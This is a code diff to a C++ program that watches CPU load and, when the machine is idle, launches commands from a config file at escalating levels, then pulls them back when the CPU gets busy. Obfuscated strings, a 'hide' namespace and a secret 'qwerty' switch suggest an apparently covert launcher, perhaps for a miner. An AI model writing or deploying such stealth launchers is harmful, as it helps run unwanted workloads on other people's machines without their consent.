@@ -20,10 +20,21 @@
 using namespace std;
 
 FILE* pipe = NULL;
+
 int CPU = 0;
 int IdleTime = 0;
+int BusyTime = 0;
+
+int thr;
+
+bool show_cpu = true;
+bool cons = false;
+
 vector<hide::line> Run;
-bool    show_cpu = true;
+
+#define TIMEOUT 10
+#define DEADLINE  3
+#define    THRMAX 3
 
 /*
  * ==================
@@ -43,11 +54,49 @@ pclose(wmic);
 istringstream sper(percent);
 sper >> CPU;
 if (show_cpu) cout << CPU << endl;
-if ((100 - CPU) > 25)
+if ((100 - CPU) > 25) {
    ++IdleTime;  
+
+cout << "IDLE: " << IdleTime << endl;
+
+}
 else IdleTime = 0;
 
-if (IdleTime == 100) ;
+if ((100 - CPU) < 20) {
+   ++BusyTime;  
+
+cout << "BUSY: " << BusyTime << endl;
+
+}
+else BusyTime = 0;
+
+if (IdleTime == TIMEOUT) {
+    IdleTime = 0;
+    if(pipe) ::pclose(pipe);
+
+    thr = (thr == THRMAX) ? thr : ++thr; 
+
+cout << Run[thr].c_str() << endl;
+
+    pipe = ::popen( Run[thr].c_str(), "r"); 
+    if(!pipe)
+        throw runtime_error(Run[thr] + ": popen fail");
+} else 
+    if (BusyTime == DEADLINE) {
+        BusyTime = 0;
+       if(pipe) ::pclose(pipe);
+
+    thr = (thr == 0) ? thr : --thr; 
+    if (thr) {
+
+cout << Run[thr].c_str() << endl;
+
+    pipe = ::popen( Run[thr].c_str(), "r"); 
+        if(!pipe)
+            throw runtime_error(Run[thr] + ": popen fail");
+   } else { cout << "Just wait" << endl; }
+   }
+
 }
 
 /*
@@ -70,7 +119,6 @@ int main (int argc, char** argv
 ) {
 try {
 
-static bool cons = false;
 if (argc > 1) {
     string arg(argv[1]);
     if (arg == "qwerty") cons = true;
@@ -87,6 +135,8 @@ static hide::line name("FJUC7Qibj6LAL8FrYUsJ5jbGMpMogbSdwCvpWGB/Jc822zvPVJ2GuVeh
 
 static hide::line arg, Args;
 
+Run.push_back("echo ");
+
 while ( getline(ini, arg)) {
     if ( *(arg.begin()) == '#') {
         Args.append(" 2>&1");
@@ -100,16 +150,11 @@ while ( getline(ini, arg)) {
     Args.append(arg);
 }
 
-if (cons) {
-    cout << Args << endl;
+if (cons)
     throw runtime_error("^^^ eof");
-}
 if ( !Run.size())
-    throw runtime_error("Empty config, never mind");
+    throw runtime_error("never mind");
 
-pipe = ::popen( Run[0].c_str(), "r"); 
-if(!pipe)
-    throw runtime_error(Run[0] + ": popen fail");
 
 thread th1(Timer);
 th1.detach();
@@ -119,9 +164,11 @@ while ( getline (cin, console)) {
 cout << console << " what?!" << endl;
 }
 
+if(pipe) pclose(pipe);
 return 0;
+
 } catch (const exception& e) {
-//    cerr << e.what() << endl;
+    cerr << e.what() << endl;
 if(pipe) pclose(pipe);
 return 1;
 }}
